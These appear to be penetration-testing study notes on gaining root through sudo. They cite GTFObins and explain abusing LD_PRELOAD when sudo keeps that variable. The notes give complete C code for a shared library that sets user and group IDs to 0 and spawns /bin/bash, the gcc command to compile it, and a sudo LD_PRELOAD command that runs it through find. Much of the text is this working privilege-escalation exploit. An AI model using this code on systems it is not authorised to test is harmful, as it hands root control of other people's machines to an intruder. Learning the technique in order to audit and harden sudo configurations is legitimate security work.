some programs may have the ability to use sudo with them
[GTFObins](https://gtfobins.github.io/) has great resources on how to get information on how to escape many program with sudo to gain root access
# If the file has no known exploits
Try checking if you can display files like /etc/passwd with sudo
## LD_PRELOAD
[this blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) shows you how to use LD_PRELOAD to inject things into programs, if env_keep option is enabled you can generate a shared library that will be loaded and executed before the program is run. NOTE LD_PRELOAD will be ignored if the real user ID is different from the effective user ID
steps:
1. Check for LD_PRELOAD with env_keep option
2. Write simple C code compiled as a shared object file
3. Run program with sudo rights and the LD_PRELOAD option pointing to the so file
### example
the c code to spawn a root shell
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
	unsetenv("LD_PRELOAD");  
	setgid(0);  
	setuid(0);  
	system("/bin/bash");  
}
```
compile it to a shared object file
```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
then running the program with the LD_PRELOAD option
```shell
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```